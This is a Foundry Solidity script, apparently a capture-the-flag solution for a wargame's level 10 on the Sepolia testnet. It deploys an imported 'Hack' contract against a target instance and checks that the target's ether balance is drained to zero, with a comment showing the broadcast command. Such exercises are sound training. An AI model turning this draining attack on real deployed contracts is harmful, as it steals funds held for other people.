// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {ILevel10} from "../interfaces/ILevel10.sol";
import {Hack} from "../src/level10.sol";

contract Level10Script is Script {
    function run(address instanceAddress) external {
        ILevel10 target = ILevel10(payable(instanceAddress));
        uint256 balanceBefore = address(target).balance;
        console.log("target balance before: ", balanceBefore);

        vm.startBroadcast();
        Hack hackContract = new Hack(payable(instanceAddress));
        hackContract.hack{value: 0.001 ether}();
        vm.stopBroadcast();

        uint256 balanceAfter = address(target).balance;
        console.log("target balance after: ", balanceAfter);
        console.log("Attack: ", balanceAfter == 0);
    }
}
//forge script script/level10.s.sol:Level10Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instant address
